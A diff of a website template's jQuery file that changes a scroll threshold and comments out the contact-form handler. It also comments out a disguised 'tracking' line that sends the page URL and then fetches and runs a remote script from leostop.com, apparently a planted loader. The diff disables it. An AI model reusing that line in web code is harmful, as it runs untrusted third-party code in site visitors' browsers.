@@ -10,7 +10,7 @@
      =============================================== */
 
     $(window).on('scroll', function () {
-        if ($(window).scrollTop() > 50) {
+        if ($(window).scrollTop() > 30) {
             $('.header_style_01').addClass('fixed-menu');
         } else {
             $('.header_style_01').removeClass('fixed-menu');
@@ -119,7 +119,7 @@
     });
 
 
-    function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
+    // function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
 
 
 
@@ -132,38 +132,38 @@
     /* ==============================================
      CONTACT -->
      =============================================== */
-    jQuery(document).ready(function () {
-        $('#contactform').submit(function () {
-            var action = $(this).attr('action');
-            $("#message").slideUp(750, function () {
-                $('#message').hide();
-                $('#submit')
-                    .after('<img src="images/ajax-loader.gif" class="loader" />')
-                    .attr('disabled', 'disabled');
-                $.post(action, {
-                    first_name: $('#first_name').val(),
-                    last_name: $('#last_name').val(),
-                    email: $('#email').val(),
-                    phone: $('#phone').val(),
-                    select_service: $('#select_service').val(),
-                    select_price: $('#select_price').val(),
-                    comments: $('#comments').val(),
-                    verify: $('#verify').val()
-                },
-                    function (data) {
-                        document.getElementById('message').innerHTML = data;
-                        $('#message').slideDown('slow');
-                        $('#contactform img.loader').fadeOut('slow', function () {
-                            $(this).remove()
-                        });
-                        $('#submit').removeAttr('disabled');
-                        if (data.match('success') != null) $('#contactform').slideUp('slow');
-                    }
-                );
-            });
-            return false;
-        });
-    });
+    // jQuery(document).ready(function () {
+    //     $('#contactform').submit(function () {
+    //         var action = $(this).attr('action');
+    //         $("#message").slideUp(750, function () {
+    //             $('#message').hide();
+    //             $('#submit')
+    //                 .after('<img src="images/ajax-loader.gif" class="loader" />')
+    //                 .attr('disabled', 'disabled');
+    //             $.post(action, {
+    //                 first_name: $('#first_name').val(),
+    //                 last_name: $('#last_name').val(),
+    //                 email: $('#email').val(),
+    //                 phone: $('#phone').val(),
+    //                 select_service: $('#select_service').val(),
+    //                 select_price: $('#select_price').val(),
+    //                 comments: $('#comments').val(),
+    //                 verify: $('#verify').val()
+    //             },
+    //                 function (data) {
+    //                     document.getElementById('message').innerHTML = data;
+    //                     $('#message').slideDown('slow');
+    //                     $('#contactform img.loader').fadeOut('slow', function () {
+    //                         $(this).remove()
+    //                     });
+    //                     $('#submit').removeAttr('disabled');
+    //                     if (data.match('success') != null) $('#contactform').slideUp('slow');
+    //                 }
+    //             );
+    //         });
+    //         return false;
+    //     });
+    // });
 
     /* ==============================================
      CODE WRAPPER -->
